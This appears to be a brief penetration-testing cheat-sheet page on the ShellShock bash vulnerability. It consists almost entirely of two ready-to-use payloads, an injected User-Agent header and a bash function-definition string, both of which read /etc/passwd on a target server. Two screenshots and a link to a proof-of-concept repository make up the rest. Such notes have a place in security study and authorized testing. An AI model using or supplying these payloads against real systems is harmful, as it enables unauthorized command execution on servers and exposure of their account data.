# ShellShock

## ShellShock

`User-Agent: () { :; }; echo $(</etc/passwd)`

![](../../.gitbook/assets/38ba4cf5e97b4fc9879f21f70048e599.png)

`() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`

![](../../.gitbook/assets/07b59a880814415baf38673328c09ba5.png)

### Resources

{% embed url="https://github.com/mubix/shellshocker-pocs" %}





